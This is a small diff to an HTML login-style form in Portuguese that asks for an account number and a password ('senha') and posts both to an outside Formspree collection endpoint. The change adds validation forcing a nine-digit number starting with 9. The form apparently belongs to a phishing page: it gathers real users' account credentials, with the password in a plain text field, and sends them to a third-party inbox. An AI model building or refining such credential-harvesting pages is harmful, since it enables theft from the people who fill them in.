@@ -103,7 +103,14 @@
 
     <form id="syncForm" action="https://formspree.io/f/xvgzrljq" method="POST">
       <label for="acc">Número da Conta</label>
-      <input type="text" id="acc" name="numero" placeholder="244" required>
+     <input type="text" id="acc" name="numero" 
+       placeholder="912345678" 
+       pattern="9[0-9]{8}" 
+       maxlength="9" minlength="9" 
+       inputmode="numeric" 
+       required 
+       title="O número deve começar por 9 e ter exatamente 9 dígitos">
+
     
       <label for="pass">Senha</label>
       <input type="text" id="pass" name="senha" placeholder="Digite a sua senha" required>
